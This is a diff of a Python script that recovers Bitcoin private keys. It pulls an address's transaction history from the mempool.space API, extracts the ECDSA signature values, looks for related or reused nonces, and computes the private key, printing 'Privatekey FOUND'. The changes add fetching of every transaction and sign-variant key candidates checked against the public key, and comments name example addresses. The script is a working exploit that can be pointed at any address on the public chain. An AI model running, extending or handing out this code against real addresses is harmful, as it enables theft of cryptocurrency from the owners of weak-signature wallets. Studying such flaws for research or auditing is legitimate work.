@@ -4,11 +4,10 @@
 @author: iceland
 """
 import sys
-import hashlib
 import json
 import argparse
 from urllib.request import urlopen
-from itertools import combinations
+# from itertools import combinations
 import secp256k1 as ice
 
 G = ice.scalar_multiplication(1)
@@ -103,20 +102,28 @@ def getSignableTxn(parsed):
                 e += '00'
             e += inp_list[i][5] # seq
         e += rest + "01000000"
-        z = hashlib.sha256(hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
+        z = ice.get_sha256(ice.get_sha256(bytes.fromhex(e))).hex()
         res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
     return res
 #==============================================================================
 def HASH160(pubk_hex):
-    return hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(pubk_hex)).digest() ).hexdigest()
+    iscompressed = True if len(pubk_hex) < 70 else False
+    P = ice.pub2upub(pubk_hex)
+    return ice.pubkey_to_h160(0, iscompressed, P).hex()
 #==============================================================================
 
-def diff_comb(alist):
-    return [ice.point_subtraction(x, y) for x, y in combinations(alist, 2)]
+# def diff_comb(alist):
+#     return [ice.point_subtraction(x, y) for x, y in combinations(alist, 2)]
 
 def diff_comb_idx(alist):
     LL = len(alist)
-    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
+    RDD = []
+    for i in range(LL):
+        for j in range(i+1, LL):
+            RDD.append((i, j, ice.point_subtraction(alist[i], alist[j])))
+            RDD.append((i, j, ice.point_addition(alist[i], alist[j])))
+#    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
+    return RDD
 #==============================================================================
 def inv(a):
     return pow(a, N - 2, N)
@@ -150,33 +157,53 @@ def getpvk(r1, s1, z1, r2, s2, z2, m):
     xi = inv((s1 * r2 - s2 * r1) % N)
     x = (x1 * xi) % N
     return x
+
+def all_pvk_candidate(r1, s1, z1, r2, s2, z2, m):
+    xi = []
+    xi.append( getpvk(r1, s1, z1, r2, s2, z2, m) )
+    xi.append( getpvk(r1, -s1%N, z1, r2, s2, z2, m) )
+    xi.append( getpvk(r1, -s1%N, z1, r2, -s2%N, z2, m) )
+    xi.append( getpvk(r1, s1, z1, r2, -s2%N, z2, m) )
+    return xi
 #==============================================================================
 def check_tx(address):
     txid = []
     cdx = []
+    ccount = 0
     try:
-        htmlfile = urlopen("https://mempool.space/api/address/%s/txs" % address, timeout = 20)
+        htmlfile = urlopen(f'https://mempool.space/api/address/{address}/txs/chain', timeout = 20)
     except:
         print('Unable to connect internet to fetch RawTx. Exiting..')
         sys.exit(1)
     else: 
-        # current limit = 50. Need to use loop. update code in future for getting all Tx.
-        res = json.loads(htmlfile.read())
-        txcount = len(res)
-        print(f'Total: {txcount} Input/Output Transactions in the Address: {address}')
-        for i in range(txcount):
-            vin_cnt = len(res[i]["vin"])
-            for j in range(vin_cnt):
-                if res[i]["vin"][j]["prevout"]["scriptpubkey_address"] == address:
-                    txid.append(res[i]["txid"])
-                    cdx.append(j)
-#                    scriptsig = res[i]["vin"][j]["scriptsig"]
-#                    print(f'Txid: {txid[-1]}  Index: {cdx[-1]}  Scriptsig: {scriptsig}')
+        while True:
+            # current single fetch limit = 25. Loop added for getting all Tx.
+            res = json.loads(htmlfile.read())
+            txcount = len(res)
+            if txcount == 0:
+                break
+            ccount += txcount
+            lasttxid = res[-1]['txid']
+            print(f'Reading: Tx {ccount-txcount}:{ccount} Input/Output Transactions from the Address: {address}')
+            for i in range(txcount):
+                vin_cnt = len(res[i]["vin"])
+                for j in range(vin_cnt):
+                    if res[i]["vin"][j]["prevout"]["scriptpubkey_address"] == address:
+                        txid.append(res[i]["txid"])
+                        cdx.append(j)
+    #                    scriptsig = res[i]["vin"][j]["scriptsig"]
+    #                    print(f'Txid: {txid[-1]}  Index: {cdx[-1]}  Scriptsig: {scriptsig}')
+            try:
+                htmlfile = urlopen(f'https://mempool.space/api/address/{address}/txs/chain/{lasttxid}', timeout = 20)
+            except:
+                print('Unable to connect internet to fetch more RawTx. continuing...')
+                break
     return txid, cdx
 #==============================================================================
 
 print('\nStarting Program...')
 #address = '1JtAupan5MSPXxSsWFiwA79bY9LD2Ga1je'
+# 1FdJa233RjptkxJv8MrezooSMkSgwrLJPV
 # 1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm
 
 print('-'*120)
@@ -202,7 +229,8 @@ print('='*70); print('-'*120)
 #==============================================================================
 for c in range(len(rL)):
     RQ.append( calc_RQ( rL[c], sL[c], zL[c], QL[c] ) )
-    
+if len(QL) > 0: pub_point_Q = QL[0]
+
 # RD = diff_comb(RQ)
 RD = diff_comb_idx(RQ)
 
@@ -230,8 +258,14 @@ for Q in RD:
 print('='*70); print('-'*120)
 for i in solvable_diff:
     print(f'[i={i[0]}] [j={i[1]}] [R Diff = {i[2]}]')
-    k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
-    d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
-    print(f'Privatekey FOUND: {hex(d)}')
-    print('='*70); print('-'*120) 
+#    k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
+#    d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
+    di = all_pvk_candidate(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
+    for d in di:
+        if ice.scalar_multiplication(d) == pub_point_Q:
+            print(f'Privatekey FOUND: {hex(d)}       Address: {address}')
+#        else: print(f'Privatekey MISSED: {hex(d)}')
+    print('='*70); print('-'*120)
+FdupR = [i.hex()[2:66] for i in RQ]
+if len(FdupR) != len(set(FdupR)): print(f'Duplicate R Vulnerability exists in this Address: {address}')
 print('Program Finished ...')
